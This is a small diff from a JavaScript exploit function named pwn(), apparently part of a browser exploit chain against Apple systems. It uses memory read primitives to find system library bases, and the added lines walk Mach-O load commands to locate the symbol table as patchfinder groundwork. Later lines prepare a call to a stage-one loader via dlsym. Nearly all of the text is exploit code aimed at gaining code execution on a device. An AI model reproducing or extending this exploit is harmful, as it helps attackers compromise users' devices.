@@ -392,8 +392,23 @@ function pwn() {
     var libsystem_kernel_base = find_dylib_by_name(libcpp1_base, "libsystem_kernel")
     log(`[+] libsystem_kernel_base: ${libsystem_kernel_base}`);
 
+
+    var lc = Add(libdyld_base, 0x20);
+    var lc_cmd;
+    while(true) {
+        lc_cmd = read32(lc)
+        if(lc_cmd == 0x2) { //LC_SYMTAB
+            log(`[+] Found LC_SYMTAB at: ${lc}`);
+            break;
+        }
+
+        var cmdsize = read32(Add(lc, 0x4));
+        lc = Add(lc, cmdsize)
+    }
+    
+
     // remove this "return" if finished patchfinder
-    // return;
+    return;
 
     // needed arguments to call stage1's _load
     var dlsym = Add(libdyld_base, offsets.dlsym);
